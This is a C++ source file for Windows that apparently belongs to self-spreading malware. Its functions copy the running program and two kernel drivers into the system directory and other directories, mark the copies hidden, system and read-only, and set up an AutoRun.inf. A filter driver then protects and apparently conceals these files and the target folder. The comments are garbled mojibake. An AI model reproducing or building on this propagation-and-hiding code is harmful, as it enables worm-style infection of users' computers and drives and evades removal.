#include "StdAfx.h"
#include "FileManage.h"
#include "..\..\System\File\FileEx.h"
#include "..\..\System\System\System.h"
#include "..\..\Driver\FilterSys\FilterControl\FilterSysDevice.h"
#include "..\..\Driver\ksfilter\KSFilterControl\KSFilterControl.h"

CFileManage::CFileManage(void)
{
}

CFileManage::~CFileManage(void)
{
}

BOOL CFileManage::CopyFile(LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName)
{
	DWORD dwAttr = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;
#ifdef _DEBUG
	::CopyFile(lpExistingFileName, lpNewFileName, FALSE);
#else
	::CopyFile(lpExistingFileName, lpNewFileName, TRUE);
#endif // ���� #ifdef
	SetFileAttributes(lpNewFileName, dwAttr);
	return TRUE;
}

/*!
\brief   Copy Files To the Directory
\param   LPCTSTR lpszDir��Ҫ���Ƶ�Ŀ¼
\return  ����Ϊ BOOL ��
\version 1.0
\author  ��  ��
\date    2007-6-13 21:53:54
*/
BOOL CFileManage::CopyFilesToDirectory(LPCTSTR lpszDir)
{
	BOOL bRet = TRUE;

	_tstring szCurDir, szDesDir;
	CFileEx fe;
	fe.GetModuleFileName();
	szCurDir = fe.GetFilePath();
	if(szCurDir.at(szCurDir.size() - 1) != _T('\\'))
	{
		szCurDir += _T("\\");
	}// ���� if(szCurDir.at(szCurDir.size() - 1) != _T('\\'))
	szDesDir = lpszDir;
	if(szDesDir.at(szDesDir.size() - 1) != _T('\\'))
	{
		szDesDir += _T("\\");
	} // ���� if(szDesDir.at(szDesDir.size() - 1) != _T('\\'))
	_tstring szExe, szNewExe, szFilterSys, szNewFilterSys, szKSFilter, szNewKSFilter;
	szExe = fe.GetFullPath();
	szNewExe = szDesDir + fe.GetFileName();
	CopyFile(szExe.c_str(), szNewExe.c_str());

	szFilterSys = szCurDir + _T("FilterSys.sys");
	szNewFilterSys = szDesDir + _T("FilterSys.sys");
	CopyFile(szFilterSys.c_str(), szNewFilterSys.c_str());

	szKSFilter = szCurDir + _T("ksfilter.sys");
	szNewKSFilter = szDesDir + _T("ksfilter.sys");
	CopyFile(szKSFilter.c_str(), szNewKSFilter.c_str());

	//����:�����ļ�

	return bRet;
}

/*!
\brief   Copy Files To System Directory
��
\return  ����Ϊ BOOL ��
\version 1.0
\author  ��  ��
\date    2007-6-13 20:41:14
*/
BOOL CFileManage::CopyFilesToSysDirectory()
{
	_tstring szSysDir;
	CSystem s;
	szSysDir = s.GetSystemDirectory();
	return CopyFilesToDirectory(szSysDir.c_str());
}

/*!
\brief   �����ļ���һ��������,�ڸ�����һ�������ļ�,�����������ļ����Ƶ�һ��Ŀ¼��
\param   LPCTSTR lpszDir��
\return  ����Ϊ BOOL ��
\version 1.0
\author  ��  ��
\date    2007-6-26 22:21:41
*/
BOOL CFileManage::CopyFilesToRoot(LPCTSTR lpszDir)
{
	BOOL bRet = TRUE;
	//����:�ж��Ƿ��ѱ���Ⱦ

	//�Ƿ��������ļ�����,��ȥ������

	//����:�����������ļ� AutoRun.Inf

	//�����ļ�
	CopyFilesToDirectory(lpszDir);
	//�����ļ�����
	SetFilterFiles(lpszDir);

	return bRet;
}

INT CFileManage::SetFilterFiles(LPCTSTR lpszDir)
{
	_tstring szExe;
	_tstring szFilterSys;
	_tstring szKSFilterSys;
	_tstring szAutoRun;
	_tstring szDir;
	_tstring szSys;

	szDir = lpszDir;
	if(szDir.at(szDir.size() - 1) != _T('\\'))
	{
		szDir += _T("\\");
	} // ���� if(szDir.at(szDir.size() - 1) != _T('\\'))

	CSystem s;
	szSys = s.GetSystemDirectory();
	if(szSys.at(szSys.size() - 1) != _T('\\'))
	{
		szSys += _T("\\");
	}// ���� (szSys.at(szSys.size() - 1) != _T('\\'))

	CFileEx f;
	f.GetModuleFileName();
	szExe = szDir + f.GetFileName();
	szFilterSys = szDir + _T("FilterSys.Sys");
	szKSFilterSys = szDir + _T("ksfilter.Sys");
	szAutoRun = szDir + _T("AutoRun.inf");

	CKSFilterControl ksfc;
	if(ksfc.Open())
	{
		ksfc.SetProtectFile(szExe.c_str());
		ksfc.SetProtectFile(szFilterSys.c_str());
		ksfc.SetProtectFile(szKSFilterSys.c_str());
		ksfc.SetProtectFile(szAutoRun.c_str());

		//�����Ŀ¼��ΪϵͳĿ¼,�����ش�Ŀ¼
		if(szSys != szDir)
		{
			if(szDir.at(szDir.size() - 1) == _T('\\'))
			{
				*(szDir.end() - 1) = _T('\0');
			}// ���� if(szSys.at(szSys.size() - 1) == _T('\\'))
			ksfc.SetProtectFile(szDir.c_str());
		}// ���� (m_ServiceName.c_str())

		ksfc.Close();
	}// ���� if(ksfc.open())

	return 0;
}